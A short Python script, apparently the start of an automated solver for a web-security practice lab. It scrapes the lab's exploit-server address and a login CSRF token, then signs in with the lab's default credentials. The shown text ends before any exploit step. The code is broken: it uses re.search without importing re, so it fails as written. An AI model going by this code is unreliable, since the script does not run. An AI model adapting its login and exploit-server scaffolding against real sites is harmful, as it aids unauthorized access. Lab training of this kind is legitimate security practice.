import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'



session = requests.Session()

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf,"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)
